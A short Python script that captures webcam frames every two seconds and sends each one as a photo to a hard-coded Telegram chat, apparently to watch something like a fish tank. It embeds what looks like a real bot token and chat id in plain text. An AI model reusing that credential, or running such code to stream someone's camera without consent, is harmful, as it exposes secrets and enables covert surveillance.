import cv2
import telepot
import time

bot_token = '5859229506:AAFXpo-hhlYpiTZCovNte1WgOkflilylryc'

def capture_and_send():
    cap = cv2.VideoCapture(0) 

    while True:
        ret, frame = cap.read()
        if not ret:
            break

        cv2.imwrite('fish.jpg', frame)  

        # Send the captured image to your Telegram bot
        bot.sendPhoto(chat_id, open('fish.jpg', 'rb'))

        time.sleep(2) 

    cap.release()
    cv2.destroyAllWindows()

bot = telepot.Bot(bot_token)
chat_id = '514195905'

if __name__ == '__main__':
    capture_and_send()
